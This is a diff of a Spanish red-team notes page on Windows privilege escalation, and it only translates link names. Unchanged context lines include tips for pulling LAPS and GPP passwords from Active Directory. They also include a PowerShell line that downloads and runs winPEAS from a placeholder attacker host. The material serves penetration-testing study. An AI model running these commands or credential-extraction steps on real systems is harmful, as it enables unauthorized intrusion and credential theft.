@@ -10,13 +10,13 @@ tags:
 primary categories:
   - "[[Red Team]]"
 secondary categories:
-  - "[[Post-Exploitation]]"
+  - "[[Post-Explotación]]"
 tertiary categories:
   - "[[Privilege Escalation]]"
 type: MOC
 linked:
   - "[[Windows PrivEsc Payloads]]"
-  - "[[Windows Post-Exploitation]]"
+  - "[[Windows Post-Explotación]]"
   - "[[LSASS Dumping]]"
   - "[[Registros de Eventos de Windows]]"
   - "[[Windows Event Logs & Finding Evil]]"
@@ -107,7 +107,7 @@ Contexto inicial asumido: shell como user estándar (RDP, WinRM, webshell, SSH, 
 
 ## 8. Active Directory pivot (si en dominio)
 
-Si el host está unido a dominio, escalada local puede no ser necesaria — atacar directo el dominio. Hub: [[Active Directory Exploitation]].
+Si el host está unido a dominio, escalada local puede no ser necesaria — atacar directo el dominio. Hub: [[Active Directory Explotación]].
 
 - **LAPS** — `ms-Mcs-AdmPwd` legible con user con GenericRead sobre computer object.
 - **GPP Passwords** (legacy) — `groups.xml` en `SYSVOL` con cpassword descifrable.
@@ -160,6 +160,6 @@ IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/winPEAS.ps1')
 - [PayloadsAllTheThings - Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 - [LOLBAS Project](https://lolbas-project.github.io/)
 - [[Windows PrivEsc Payloads]] — payloads listos para lanzar.
-- [[Windows Post-Exploitation]] — qué hacer después.
+- [[Windows Post-Explotación]] — qué hacer después.
 
 ***
